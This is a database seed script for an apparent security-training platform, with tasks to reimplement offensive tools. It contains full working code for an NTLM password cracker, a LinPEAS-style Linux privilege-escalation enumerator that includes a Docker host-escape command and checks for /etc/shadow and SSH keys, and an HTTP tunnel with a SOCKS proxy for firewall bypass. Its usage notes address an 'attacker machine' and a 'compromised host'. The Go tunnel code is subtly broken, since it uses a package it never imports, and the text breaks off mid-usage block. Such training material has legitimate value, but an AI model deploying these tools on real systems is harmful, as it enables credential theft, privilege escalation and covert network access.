#!/usr/bin/env npx tsx
/**
 * Seed: Password Cracking & Privilege Escalation Tools
 * Hashcat, LinPEAS, WinPEAS, Chisel
 */

import Database from 'better-sqlite3';
import { join } from 'path';

const db = new Database(join(process.cwd(), 'data', 'quest-log.db'));
const now = Date.now();

const insertPath = db.prepare(`
	INSERT INTO paths (name, description, color, language, difficulty, estimated_weeks, skills, created_at)
	VALUES (?, ?, ?, ?, ?, ?, ?, ?)
`);

const insertModule = db.prepare(`
	INSERT INTO modules (path_id, name, description, order_index, created_at)
	VALUES (?, ?, ?, ?, ?)
`);

const insertTask = db.prepare(`
	INSERT INTO tasks (module_id, title, description, details, order_index, created_at)
	VALUES (?, ?, ?, ?, ?, ?)
`);

// ============================================================================
// HASHCAT REIMPLEMENTATION
// ============================================================================
const hashcatPath = insertPath.run(
	'Reimplement: Password Cracker',
	'Build a high-performance password cracker. Support for multiple hash types, rule-based attacks, and GPU acceleration fundamentals.',
	'red',
	'C+Rust',
	'advanced',
	16,
	'Cryptography, hash algorithms, GPU computing, optimization',
	now
);

const hashMod1 = insertModule.run(hashcatPath.lastInsertRowid, 'Hash Cracking Engine', 'Core password cracking functionality', 0, now);

insertTask.run(hashMod1.lastInsertRowid, 'Build NTLM Cracker', 'Implement high-speed NTLM hash cracking using optimized MD4 computation, supporting dictionary attacks, rule-based mutations, and mask attacks with GPU acceleration via OpenCL for cracking Windows password hashes', `## NTLM Hash Cracker

### Overview
Build a high-performance NTLM hash cracker with dictionary and rule-based attacks.

### Rust Implementation
\`\`\`rust
//! NTLM Hash Cracker
//! Fast MD4-based password cracking

use std::fs::File;
use std::io::{BufRead, BufReader};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use md4::{Md4, Digest};
use rayon::prelude::*;

#[derive(Clone)]
pub struct NTLMHash {
    bytes: [u8; 16],
    original: String,
}

impl NTLMHash {
    pub fn from_hex(hex: &str) -> Option<Self> {
        if hex.len() != 32 {
            return None;
        }

        let mut bytes = [0u8; 16];
        for i in 0..16 {
            bytes[i] = u8::from_str_radix(&hex[i*2..i*2+2], 16).ok()?;
        }

        Some(Self {
            bytes,
            original: hex.to_lowercase(),
        })
    }
}

pub fn compute_ntlm(password: &str) -> [u8; 16] {
    // NTLM = MD4(UTF-16LE(password))
    let utf16: Vec<u16> = password.encode_utf16().collect();
    let bytes: Vec<u8> = utf16.iter()
        .flat_map(|&c| c.to_le_bytes())
        .collect();

    let mut hasher = Md4::new();
    hasher.update(&bytes);
    let result = hasher.finalize();

    let mut hash = [0u8; 16];
    hash.copy_from_slice(&result);
    hash
}

pub struct Cracker {
    hashes: Vec<NTLMHash>,
    found: Arc<AtomicU64>,
    running: Arc<AtomicBool>,
}

impl Cracker {
    pub fn new(hash_file: &str) -> Self {
        let file = File::open(hash_file).expect("Cannot open hash file");
        let reader = BufReader::new(file);

        let hashes: Vec<NTLMHash> = reader.lines()
            .filter_map(|line| line.ok())
            .filter_map(|line| {
                // Handle different formats
                let hash_str = if line.contains(':') {
                    // user:hash or user:rid:lm:ntlm:::
                    line.split(':').nth(3).or_else(|| line.split(':').nth(1))
                } else {
                    Some(line.as_str())
                };

                hash_str.and_then(|h| NTLMHash::from_hex(h.trim()))
            })
            .collect();

        println!("[*] Loaded {} hashes", hashes.len());

        Self {
            hashes,
            found: Arc::new(AtomicU64::new(0)),
            running: Arc::new(AtomicBool::new(true)),
        }
    }

    pub fn dictionary_attack(&self, wordlist: &str) -> Vec<(String, String)> {
        let file = File::open(wordlist).expect("Cannot open wordlist");
        let reader = BufReader::new(file);

        let words: Vec<String> = reader.lines()
            .filter_map(|l| l.ok())
            .collect();

        println!("[*] Loaded {} words", words.len());
        println!("[*] Starting dictionary attack...");

        let results: Vec<(String, String)> = words.par_iter()
            .filter_map(|word| {
                if !self.running.load(Ordering::Relaxed) {
                    return None;
                }

                let hash = compute_ntlm(word);

                for target in &self.hashes {
                    if hash == target.bytes {
                        self.found.fetch_add(1, Ordering::Relaxed);
                        println!("[+] {} : {}", target.original, word);
                        return Some((target.original.clone(), word.clone()));
                    }
                }
                None
            })
            .collect();

        results
    }

    pub fn rule_attack(&self, wordlist: &str, rules: &[Rule]) -> Vec<(String, String)> {
        let file = File::open(wordlist).expect("Cannot open wordlist");
        let reader = BufReader::new(file);

        let words: Vec<String> = reader.lines()
            .filter_map(|l| l.ok())
            .collect();

        println!("[*] Starting rule-based attack with {} rules", rules.len());

        let results: Vec<(String, String)> = words.par_iter()
            .flat_map(|word| {
                let mut candidates = vec![word.clone()];

                for rule in rules {
                    candidates.extend(rule.apply(word));
                }

                candidates
            })
            .filter_map(|candidate| {
                let hash = compute_ntlm(&candidate);

                for target in &self.hashes {
                    if hash == target.bytes {
                        self.found.fetch_add(1, Ordering::Relaxed);
                        println!("[+] {} : {}", target.original, candidate);
                        return Some((target.original.clone(), candidate));
                    }
                }
                None
            })
            .collect();

        results
    }

    pub fn brute_force(&self, charset: &str, min_len: usize, max_len: usize) {
        println!("[*] Brute force: charset={}, length={}-{}", charset, min_len, max_len);

        let chars: Vec<char> = charset.chars().collect();

        for len in min_len..=max_len {
            println!("[*] Trying length {}", len);
            self.brute_force_length(&chars, len);
        }
    }

    fn brute_force_length(&self, chars: &[char], length: usize) {
        let total = (chars.len() as u64).pow(length as u32);

        (0..total).into_par_iter().for_each(|n| {
            if !self.running.load(Ordering::Relaxed) {
                return;
            }

            let candidate = self.index_to_string(chars, n, length);
            let hash = compute_ntlm(&candidate);

            for target in &self.hashes {
                if hash == target.bytes {
                    self.found.fetch_add(1, Ordering::Relaxed);
                    println!("[+] {} : {}", target.original, candidate);
                }
            }
        });
    }

    fn index_to_string(&self, chars: &[char], mut n: u64, length: usize) -> String {
        let base = chars.len() as u64;
        let mut result = String::with_capacity(length);

        for _ in 0..length {
            result.push(chars[(n % base) as usize]);
            n /= base;
        }

        result.chars().rev().collect()
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }
}

#[derive(Clone)]
pub enum Rule {
    Lowercase,
    Uppercase,
    Capitalize,
    Reverse,
    Append(String),
    Prepend(String),
    L33t,
    Duplicate,
    ToggleCase,
}

impl Rule {
    pub fn apply(&self, word: &str) -> Vec<String> {
        match self {
            Rule::Lowercase => vec![word.to_lowercase()],
            Rule::Uppercase => vec![word.to_uppercase()],
            Rule::Capitalize => {
                let mut c = word.chars();
                match c.next() {
                    None => vec![String::new()],
                    Some(f) => vec![f.to_uppercase().chain(c).collect()],
                }
            }
            Rule::Reverse => vec![word.chars().rev().collect()],
            Rule::Append(s) => vec![format!("{}{}", word, s)],
            Rule::Prepend(s) => vec![format!("{}{}", s, word)],
            Rule::L33t => {
                let leet: String = word.chars().map(|c| match c {
                    'a' | 'A' => '4',
                    'e' | 'E' => '3',
                    'i' | 'I' => '1',
                    'o' | 'O' => '0',
                    's' | 'S' => '5',
                    't' | 'T' => '7',
                    _ => c,
                }).collect();
                vec![leet]
            }
            Rule::Duplicate => vec![format!("{}{}", word, word)],
            Rule::ToggleCase => {
                vec![word.chars().map(|c| {
                    if c.is_uppercase() { c.to_lowercase().next().unwrap() }
                    else { c.to_uppercase().next().unwrap() }
                }).collect()]
            }
        }
    }
}

fn main() {
    let args: Vec<String> = std::env::args().collect();

    if args.len() < 3 {
        println!("Usage: {} <hashfile> <wordlist> [--rules]", args[0]);
        return;
    }

    let cracker = Cracker::new(&args[1]);

    if args.contains(&"--rules".to_string()) {
        let rules = vec![
            Rule::Lowercase,
            Rule::Uppercase,
            Rule::Capitalize,
            Rule::L33t,
            Rule::Append("1".to_string()),
            Rule::Append("123".to_string()),
            Rule::Append("!".to_string()),
            Rule::Append("2024".to_string()),
        ];

        cracker.rule_attack(&args[2], &rules);
    } else {
        cracker.dictionary_attack(&args[2]);
    }

    println!("\\n[*] Cracked: {} hashes", cracker.found.load(Ordering::Relaxed));
}
\`\`\`

### Python Implementation
\`\`\`python
#!/usr/bin/env python3
"""
Simple NTLM Cracker
"""

import hashlib
import sys
from multiprocessing import Pool, cpu_count
from typing import List, Tuple, Optional


def ntlm_hash(password: str) -> str:
    """Compute NTLM hash of password"""
    # NTLM = MD4(UTF-16LE(password))
    return hashlib.new('md4', password.encode('utf-16-le')).hexdigest()


def crack_worker(args: Tuple[str, List[str]]) -> Optional[Tuple[str, str]]:
    """Worker function for parallel cracking"""
    word, hashes = args

    computed = ntlm_hash(word)

    for target in hashes:
        if computed.lower() == target.lower():
            return (target, word)

    return None


def crack_dictionary(hashes: List[str], wordlist: str) -> List[Tuple[str, str]]:
    """Dictionary attack"""
    with open(wordlist, 'r', errors='ignore') as f:
        words = [line.strip() for line in f]

    print(f"[*] Loaded {len(words)} words")

    # Prepare work items
    work = [(word, hashes) for word in words]

    # Parallel cracking
    results = []
    with Pool(cpu_count()) as pool:
        for result in pool.imap_unordered(crack_worker, work, chunksize=1000):
            if result:
                print(f"[+] {result[0]} : {result[1]}")
                results.append(result)

    return results


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <hashfile> <wordlist>")
        sys.exit(1)

    with open(sys.argv[1]) as f:
        hashes = [line.strip().split(':')[-1] for line in f]

    print(f"[*] Loaded {len(hashes)} hashes")

    results = crack_dictionary(hashes, sys.argv[2])
    print(f"\\n[*] Cracked {len(results)} hashes")
\`\`\`
`, 0, now);

// ============================================================================
// LINPEAS / WINPEAS
// ============================================================================
const peasPath = insertPath.run(
	'Reimplement: Privilege Escalation Enumeration',
	'Build privilege escalation enumeration tools like LinPEAS/WinPEAS. Automated system enumeration for finding privesc vectors.',
	'orange',
	'Python+Go',
	'intermediate',
	10,
	'Linux internals, Windows internals, SUID, services, misconfigurations',
	now
);

const peasMod1 = insertModule.run(peasPath.lastInsertRowid, 'Linux Privilege Escalation', 'LinPEAS-style enumeration', 0, now);

insertTask.run(peasMod1.lastInsertRowid, 'Build Linux PrivEsc Checker', 'Enumerate SUID binaries, writable paths, cron jobs, sudo permissions, kernel version, Docker socket access, and other privilege escalation vectors on Linux systems with color-coded output highlighting critical findings', `## Linux Privilege Escalation Checker

### Overview
Automated enumeration of Linux privesc vectors.

### Python Implementation
\`\`\`python
#!/usr/bin/env python3
"""
LinPEAS-style Privilege Escalation Checker
"""

import os
import pwd
import grp
import subprocess
import re
from pathlib import Path
from typing import List, Dict, Tuple
from dataclasses import dataclass


# ANSI colors
class Colors:
    RED = '\\033[91m'
    GREEN = '\\033[92m'
    YELLOW = '\\033[93m'
    BLUE = '\\033[94m'
    MAGENTA = '\\033[95m'
    CYAN = '\\033[96m'
    RESET = '\\033[0m'
    BOLD = '\\033[1m'


@dataclass
class Finding:
    category: str
    severity: str  # critical, high, medium, low, info
    title: str
    description: str
    details: List[str]


class LinuxPrivescChecker:
    """Linux Privilege Escalation Checker"""

    def __init__(self):
        self.findings: List[Finding] = []
        self.current_user = os.getenv('USER', 'unknown')
        self.uid = os.getuid()
        self.gid = os.getgid()

    def run_all_checks(self):
        """Run all privilege escalation checks"""

        self._banner()

        print(f"\\n{Colors.CYAN}[*] System Information{Colors.RESET}")
        self.check_system_info()

        print(f"\\n{Colors.CYAN}[*] User Information{Colors.RESET}")
        self.check_user_info()

        print(f"\\n{Colors.CYAN}[*] SUID/SGID Binaries{Colors.RESET}")
        self.check_suid_sgid()

        print(f"\\n{Colors.CYAN}[*] Capabilities{Colors.RESET}")
        self.check_capabilities()

        print(f"\\n{Colors.CYAN}[*] Sudo Permissions{Colors.RESET}")
        self.check_sudo()

        print(f"\\n{Colors.CYAN}[*] Cron Jobs{Colors.RESET}")
        self.check_cron()

        print(f"\\n{Colors.CYAN}[*] Writable Paths{Colors.RESET}")
        self.check_writable_paths()

        print(f"\\n{Colors.CYAN}[*] SSH Keys{Colors.RESET}")
        self.check_ssh_keys()

        print(f"\\n{Colors.CYAN}[*] Interesting Files{Colors.RESET}")
        self.check_interesting_files()

        print(f"\\n{Colors.CYAN}[*] Processes{Colors.RESET}")
        self.check_processes()

        print(f"\\n{Colors.CYAN}[*] Network{Colors.RESET}")
        self.check_network()

        print(f"\\n{Colors.CYAN}[*] Docker/LXC{Colors.RESET}")
        self.check_containers()

        self._summary()

    def _banner(self):
        print(f"""
{Colors.YELLOW}╔═══════════════════════════════════════════════╗
║     Linux Privilege Escalation Checker         ║
╚═══════════════════════════════════════════════╝{Colors.RESET}
""")

    def _run_cmd(self, cmd: str, timeout: int = 10) -> str:
        """Run command and return output"""
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True,
                text=True, timeout=timeout
            )
            return result.stdout + result.stderr
        except:
            return ""

    def check_system_info(self):
        """Check system information"""

        # Kernel version
        kernel = self._run_cmd("uname -a").strip()
        print(f"  Kernel: {kernel}")

        # Check for kernel exploits
        kernel_version = self._run_cmd("uname -r").strip()
        self._check_kernel_exploits(kernel_version)

        # OS info
        if os.path.exists('/etc/os-release'):
            with open('/etc/os-release') as f:
                for line in f:
                    if line.startswith('PRETTY_NAME'):
                        os_name = line.split('=')[1].strip().strip('"')
                        print(f"  OS: {os_name}")
                        break

    def _check_kernel_exploits(self, version: str):
        """Check for known kernel exploits"""

        exploits = {
            '2.6': ['dirtycow', 'rds', 'perf_swevent'],
            '3.': ['overlayfs', 'dirtycow'],
            '4.4': ['dirtycow'],
            '4.8': ['dirtycow'],
            '5.8': ['dirty_pipe'],
        }

        for ver, vulns in exploits.items():
            if version.startswith(ver):
                self.findings.append(Finding(
                    category='Kernel',
                    severity='high',
                    title=f'Potentially vulnerable kernel: {version}',
                    description=f'Known exploits: {", ".join(vulns)}',
                    details=[f'Kernel version: {version}']
                ))
                print(f"  {Colors.RED}[!] Potentially vulnerable kernel!{Colors.RESET}")
                print(f"      Known exploits: {', '.join(vulns)}")

    def check_user_info(self):
        """Check user information"""

        print(f"  Current user: {self.current_user} (uid={self.uid}, gid={self.gid})")

        # Groups
        groups = [grp.getgrgid(g).gr_name for g in os.getgroups()]
        print(f"  Groups: {', '.join(groups)}")

        # Check interesting groups
        interesting_groups = ['docker', 'lxd', 'wheel', 'sudo', 'admin', 'disk', 'video']
        for g in groups:
            if g in interesting_groups:
                self.findings.append(Finding(
                    category='User',
                    severity='high' if g in ['docker', 'lxd', 'disk'] else 'medium',
                    title=f'User in {g} group',
                    description=f'Membership in {g} group may allow privilege escalation',
                    details=[f'Groups: {", ".join(groups)}']
                ))
                print(f"  {Colors.YELLOW}[+] Member of {g} group{Colors.RESET}")

    def check_suid_sgid(self):
        """Check for SUID/SGID binaries"""

        # Known exploitable SUID binaries
        gtfobins = [
            'bash', 'sh', 'zsh', 'ksh', 'csh',
            'python', 'python3', 'perl', 'ruby', 'php',
            'vim', 'vi', 'nano', 'less', 'more', 'head', 'tail',
            'awk', 'sed', 'find', 'cp', 'mv', 'chmod',
            'nmap', 'nc', 'netcat', 'socat', 'wget', 'curl',
            'base64', 'tar', 'zip', 'gzip',
            'env', 'watch', 'strace', 'ltrace',
            'docker', 'pkexec', 'doas',
        ]

        output = self._run_cmd("find / -perm -4000 -type f 2>/dev/null")
        suid_files = [f for f in output.strip().split('\\n') if f]

        for suid_file in suid_files:
            basename = os.path.basename(suid_file)

            if basename in gtfobins:
                self.findings.append(Finding(
                    category='SUID',
                    severity='critical',
                    title=f'Exploitable SUID: {suid_file}',
                    description=f'{basename} with SUID can be exploited for privesc',
                    details=[f'See: https://gtfobins.github.io/gtfobins/{basename}/']
                ))
                print(f"  {Colors.RED}[!] {suid_file} - GTFOBins exploitable!{Colors.RESET}")
            else:
                print(f"  {suid_file}")

    def check_capabilities(self):
        """Check file capabilities"""

        dangerous_caps = ['cap_setuid', 'cap_setgid', 'cap_dac_override', 'cap_sys_admin', 'cap_sys_ptrace']

        output = self._run_cmd("getcap -r / 2>/dev/null")

        for line in output.strip().split('\\n'):
            if not line:
                continue

            for cap in dangerous_caps:
                if cap in line:
                    self.findings.append(Finding(
                        category='Capabilities',
                        severity='high',
                        title=f'Dangerous capability: {cap}',
                        description=line,
                        details=[]
                    ))
                    print(f"  {Colors.RED}[!] {line}{Colors.RESET}")
                    break
            else:
                print(f"  {line}")

    def check_sudo(self):
        """Check sudo permissions"""

        output = self._run_cmd("sudo -l 2>/dev/null")

        if 'NOPASSWD' in output:
            self.findings.append(Finding(
                category='Sudo',
                severity='high',
                title='NOPASSWD sudo entries found',
                description='Can run commands as root without password',
                details=output.split('\\n')
            ))
            print(f"  {Colors.RED}[!] NOPASSWD entries found!{Colors.RESET}")

        if '(ALL : ALL) ALL' in output:
            self.findings.append(Finding(
                category='Sudo',
                severity='critical',
                title='Full sudo access',
                description='User can run any command as root',
                details=[]
            ))
            print(f"  {Colors.RED}[!] Full sudo access!{Colors.RESET}")

        if output:
            for line in output.strip().split('\\n'):
                print(f"  {line}")

    def check_cron(self):
        """Check cron jobs"""

        cron_dirs = [
            '/etc/crontab',
            '/etc/cron.d/',
            '/var/spool/cron/crontabs/',
        ]

        for path in cron_dirs:
            if os.path.exists(path):
                if os.path.isfile(path):
                    self._check_cron_file(path)
                else:
                    for f in os.listdir(path):
                        self._check_cron_file(os.path.join(path, f))

    def _check_cron_file(self, path: str):
        """Check a cron file for vulnerabilities"""

        try:
            with open(path) as f:
                content = f.read()

            # Check for writable scripts
            for line in content.split('\\n'):
                if line.startswith('#') or not line.strip():
                    continue

                # Extract command/script
                parts = line.split()
                if len(parts) >= 6:
                    cmd = ' '.join(parts[5:])

                    # Check if script is writable
                    script_path = parts[5].split()[0] if parts[5] else None
                    if script_path and os.path.exists(script_path):
                        if os.access(script_path, os.W_OK):
                            self.findings.append(Finding(
                                category='Cron',
                                severity='critical',
                                title=f'Writable cron script: {script_path}',
                                description='Script executed by cron is writable',
                                details=[line]
                            ))
                            print(f"  {Colors.RED}[!] Writable: {script_path}{Colors.RESET}")
                        else:
                            print(f"  {line}")

        except PermissionError:
            pass

    def check_writable_paths(self):
        """Check for writable paths in PATH"""

        path = os.environ.get('PATH', '').split(':')

        for p in path:
            if os.path.exists(p) and os.access(p, os.W_OK):
                self.findings.append(Finding(
                    category='PATH',
                    severity='high',
                    title=f'Writable PATH directory: {p}',
                    description='Can inject malicious binaries',
                    details=[]
                ))
                print(f"  {Colors.RED}[!] Writable: {p}{Colors.RESET}")
            else:
                print(f"  {p}")

    def check_ssh_keys(self):
        """Check for SSH keys"""

        ssh_dirs = [
            os.path.expanduser('~/.ssh'),
            '/root/.ssh',
        ]

        for user_dir in Path('/home').iterdir():
            ssh_dirs.append(user_dir / '.ssh')

        for ssh_dir in ssh_dirs:
            if os.path.exists(ssh_dir):
                for f in ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519']:
                    key_path = os.path.join(ssh_dir, f)
                    if os.path.exists(key_path) and os.access(key_path, os.R_OK):
                        self.findings.append(Finding(
                            category='SSH',
                            severity='high',
                            title=f'Readable SSH key: {key_path}',
                            description='Private SSH key is readable',
                            details=[]
                        ))
                        print(f"  {Colors.YELLOW}[+] Readable key: {key_path}{Colors.RESET}")

    def check_interesting_files(self):
        """Check for interesting files"""

        files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/sudoers',
            '/root/.bash_history',
            '/root/.ssh/id_rsa',
        ]

        for f in files:
            if os.path.exists(f):
                if os.access(f, os.R_OK):
                    if f == '/etc/shadow':
                        self.findings.append(Finding(
                            category='Files',
                            severity='critical',
                            title='/etc/shadow is readable',
                            description='Can extract password hashes',
                            details=[]
                        ))
                        print(f"  {Colors.RED}[!] Readable: {f}{Colors.RESET}")
                    else:
                        print(f"  Readable: {f}")
                if os.access(f, os.W_OK):
                    self.findings.append(Finding(
                        category='Files',
                        severity='critical',
                        title=f'{f} is writable',
                        description='Critical file is writable',
                        details=[]
                    ))
                    print(f"  {Colors.RED}[!] Writable: {f}{Colors.RESET}")

    def check_processes(self):
        """Check running processes"""

        output = self._run_cmd("ps aux")

        interesting = ['mysql', 'postgres', 'mongo', 'redis', 'docker', 'apache', 'nginx']

        for line in output.split('\\n')[1:]:
            for proc in interesting:
                if proc in line.lower():
                    print(f"  {line[:100]}...")
                    break

    def check_network(self):
        """Check network configuration"""

        # Listening ports
        output = self._run_cmd("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
        print(f"  Listening ports:")
        for line in output.strip().split('\\n')[:10]:
            print(f"    {line}")

    def check_containers(self):
        """Check for container escape possibilities"""

        # Docker socket
        if os.path.exists('/var/run/docker.sock'):
            if os.access('/var/run/docker.sock', os.W_OK):
                self.findings.append(Finding(
                    category='Container',
                    severity='critical',
                    title='Docker socket is accessible',
                    description='Can escape to host via Docker',
                    details=['docker run -v /:/host -it alpine chroot /host']
                ))
                print(f"  {Colors.RED}[!] Docker socket writable!{Colors.RESET}")

        # Check if in container
        if os.path.exists('/.dockerenv'):
            print(f"  {Colors.YELLOW}[*] Running inside Docker container{Colors.RESET}")

    def _summary(self):
        """Print summary"""

        print(f"\\n{Colors.CYAN}{'='*50}{Colors.RESET}")
        print(f"{Colors.BOLD}SUMMARY{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")

        critical = [f for f in self.findings if f.severity == 'critical']
        high = [f for f in self.findings if f.severity == 'high']
        medium = [f for f in self.findings if f.severity == 'medium']

        if critical:
            print(f"\\n{Colors.RED}CRITICAL ({len(critical)}):{Colors.RESET}")
            for f in critical:
                print(f"  - {f.title}")

        if high:
            print(f"\\n{Colors.YELLOW}HIGH ({len(high)}):{Colors.RESET}")
            for f in high:
                print(f"  - {f.title}")

        if medium:
            print(f"\\n{Colors.BLUE}MEDIUM ({len(medium)}):{Colors.RESET}")
            for f in medium:
                print(f"  - {f.title}")


if __name__ == '__main__':
    checker = LinuxPrivescChecker()
    checker.run_all_checks()
\`\`\`
`, 0, now);

// ============================================================================
// CHISEL / TUNNELING
// ============================================================================
const chiselPath = insertPath.run(
	'Reimplement: Network Tunneling Tools',
	'Build network tunneling tools like Chisel and Ligolo. HTTP tunneling, SOCKS proxies, and port forwarding for pivoting.',
	'teal',
	'Go+Rust',
	'advanced',
	10,
	'TCP/UDP tunneling, SOCKS5, HTTP tunneling, pivoting',
	now
);

const chiselMod1 = insertModule.run(chiselPath.lastInsertRowid, 'HTTP Tunneling', 'TCP over HTTP tunneling', 0, now);

insertTask.run(chiselMod1.lastInsertRowid, 'Build HTTP Tunnel', 'Encapsulate TCP traffic within HTTP/HTTPS requests using WebSocket upgrades or chunked encoding, bypassing firewalls and proxies to create reverse tunnels for accessing internal network services from external locations', `## HTTP Tunnel

### Overview
Tunnel TCP connections over HTTP for firewall bypass.

### Go Implementation
\`\`\`go
package main

import (
    "encoding/base64"
    "flag"
    "fmt"
    "io"
    "log"
    "net"
    "net/http"
    "sync"
    "time"
)

// Tunnel represents a tunnel connection
type Tunnel struct {
    ID         string
    LocalConn  net.Conn
    RemoteAddr string
    DataChan   chan []byte
    Done       chan struct{}
}

// Server handles incoming tunnel connections
type Server struct {
    tunnels map[string]*Tunnel
    mu      sync.RWMutex
}

func NewServer() *Server {
    return &Server{
        tunnels: make(map[string]*Tunnel),
    }
}

func (s *Server) handleConnect(w http.ResponseWriter, r *http.Request) {
    // Create new tunnel
    tunnelID := r.URL.Query().Get("id")
    remoteAddr := r.URL.Query().Get("remote")

    if tunnelID == "" || remoteAddr == "" {
        http.Error(w, "Missing parameters", http.StatusBadRequest)
        return
    }

    // Connect to remote
    conn, err := net.DialTimeout("tcp", remoteAddr, 10*time.Second)
    if err != nil {
        http.Error(w, fmt.Sprintf("Failed to connect: %v", err), http.StatusBadGateway)
        return
    }

    tunnel := &Tunnel{
        ID:         tunnelID,
        LocalConn:  conn,
        RemoteAddr: remoteAddr,
        DataChan:   make(chan []byte, 100),
        Done:       make(chan struct{}),
    }

    s.mu.Lock()
    s.tunnels[tunnelID] = tunnel
    s.mu.Unlock()

    // Start reading from remote
    go s.readFromRemote(tunnel)

    w.WriteHeader(http.StatusOK)
    fmt.Fprintf(w, "Tunnel %s created", tunnelID)
}

func (s *Server) readFromRemote(t *Tunnel) {
    defer func() {
        t.LocalConn.Close()
        close(t.Done)
        s.mu.Lock()
        delete(s.tunnels, t.ID)
        s.mu.Unlock()
    }()

    buf := make([]byte, 32*1024)
    for {
        n, err := t.LocalConn.Read(buf)
        if err != nil {
            return
        }

        data := make([]byte, n)
        copy(data, buf[:n])

        select {
        case t.DataChan <- data:
        case <-t.Done:
            return
        }
    }
}

func (s *Server) handleData(w http.ResponseWriter, r *http.Request) {
    tunnelID := r.URL.Query().Get("id")

    s.mu.RLock()
    tunnel, exists := s.tunnels[tunnelID]
    s.mu.RUnlock()

    if !exists {
        http.Error(w, "Tunnel not found", http.StatusNotFound)
        return
    }

    if r.Method == "POST" {
        // Send data to remote
        body, err := io.ReadAll(r.Body)
        if err != nil {
            http.Error(w, "Failed to read body", http.StatusBadRequest)
            return
        }

        decoded, err := base64.StdEncoding.DecodeString(string(body))
        if err != nil {
            http.Error(w, "Invalid base64", http.StatusBadRequest)
            return
        }

        _, err = tunnel.LocalConn.Write(decoded)
        if err != nil {
            http.Error(w, "Write failed", http.StatusInternalServerError)
            return
        }

        w.WriteHeader(http.StatusOK)

    } else if r.Method == "GET" {
        // Receive data from remote
        select {
        case data := <-tunnel.DataChan:
            encoded := base64.StdEncoding.EncodeToString(data)
            w.Write([]byte(encoded))
        case <-time.After(30 * time.Second):
            w.WriteHeader(http.StatusNoContent)
        case <-tunnel.Done:
            http.Error(w, "Tunnel closed", http.StatusGone)
        }
    }
}

func (s *Server) handleClose(w http.ResponseWriter, r *http.Request) {
    tunnelID := r.URL.Query().Get("id")

    s.mu.Lock()
    tunnel, exists := s.tunnels[tunnelID]
    if exists {
        close(tunnel.Done)
        delete(s.tunnels, tunnelID)
    }
    s.mu.Unlock()

    w.WriteHeader(http.StatusOK)
}

func runServer(addr string) {
    server := NewServer()

    http.HandleFunc("/connect", server.handleConnect)
    http.HandleFunc("/data", server.handleData)
    http.HandleFunc("/close", server.handleClose)

    log.Printf("Tunnel server listening on %s", addr)
    log.Fatal(http.ListenAndServe(addr, nil))
}

// Client connects through the tunnel
type Client struct {
    serverURL string
    tunnelID  string
}

func NewClient(serverURL string) *Client {
    return &Client{
        serverURL: serverURL,
        tunnelID:  fmt.Sprintf("%d", time.Now().UnixNano()),
    }
}

func (c *Client) Connect(remoteAddr string) error {
    url := fmt.Sprintf("%s/connect?id=%s&remote=%s", c.serverURL, c.tunnelID, remoteAddr)

    resp, err := http.Get(url)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        return fmt.Errorf("connect failed: %s", resp.Status)
    }

    return nil
}

func (c *Client) Send(data []byte) error {
    encoded := base64.StdEncoding.EncodeToString(data)
    url := fmt.Sprintf("%s/data?id=%s", c.serverURL, c.tunnelID)

    resp, err := http.Post(url, "text/plain", strings.NewReader(encoded))
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    return nil
}

func (c *Client) Receive() ([]byte, error) {
    url := fmt.Sprintf("%s/data?id=%s", c.serverURL, c.tunnelID)

    resp, err := http.Get(url)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    if resp.StatusCode == http.StatusNoContent {
        return nil, nil
    }

    body, err := io.ReadAll(resp.Body)
    if err != nil {
        return nil, err
    }

    return base64.StdEncoding.DecodeString(string(body))
}

func (c *Client) Close() {
    url := fmt.Sprintf("%s/close?id=%s", c.serverURL, c.tunnelID)
    http.Get(url)
}

// Local SOCKS proxy using tunnel
func runSOCKSProxy(listenAddr, serverURL string) {
    listener, err := net.Listen("tcp", listenAddr)
    if err != nil {
        log.Fatal(err)
    }

    log.Printf("SOCKS5 proxy listening on %s", listenAddr)

    for {
        conn, err := listener.Accept()
        if err != nil {
            continue
        }

        go handleSOCKS(conn, serverURL)
    }
}

func handleSOCKS(conn net.Conn, serverURL string) {
    defer conn.Close()

    // SOCKS5 handshake
    buf := make([]byte, 256)

    // Read version and auth methods
    n, err := conn.Read(buf)
    if err != nil || n < 2 || buf[0] != 0x05 {
        return
    }

    // No auth
    conn.Write([]byte{0x05, 0x00})

    // Read connect request
    n, err = conn.Read(buf)
    if err != nil || n < 7 {
        return
    }

    // Parse address
    var addr string
    switch buf[3] {
    case 0x01: // IPv4
        addr = fmt.Sprintf("%d.%d.%d.%d:%d",
            buf[4], buf[5], buf[6], buf[7],
            int(buf[8])<<8|int(buf[9]))
    case 0x03: // Domain
        length := int(buf[4])
        addr = fmt.Sprintf("%s:%d",
            string(buf[5:5+length]),
            int(buf[5+length])<<8|int(buf[6+length]))
    default:
        conn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
        return
    }

    // Connect through tunnel
    client := NewClient(serverURL)
    if err := client.Connect(addr); err != nil {
        conn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
        return
    }

    // Success
    conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})

    // Relay data
    go func() {
        for {
            data, err := client.Receive()
            if err != nil {
                return
            }
            if data != nil {
                conn.Write(data)
            }
        }
    }()

    buf = make([]byte, 32*1024)
    for {
        n, err := conn.Read(buf)
        if err != nil {
            client.Close()
            return
        }
        client.Send(buf[:n])
    }
}

func main() {
    mode := flag.String("mode", "server", "Mode: server or client")
    addr := flag.String("addr", ":8080", "Listen address (server) or server URL (client)")
    socks := flag.String("socks", ":1080", "SOCKS proxy address (client mode)")

    flag.Parse()

    if *mode == "server" {
        runServer(*addr)
    } else {
        runSOCKSProxy(*socks, *addr)
    }
}
\`\`\`

### Usage
\`\`\`bash
# Server (on attacker machine)
./tunnel -mode server -addr :8080

# Client (on compromised host)
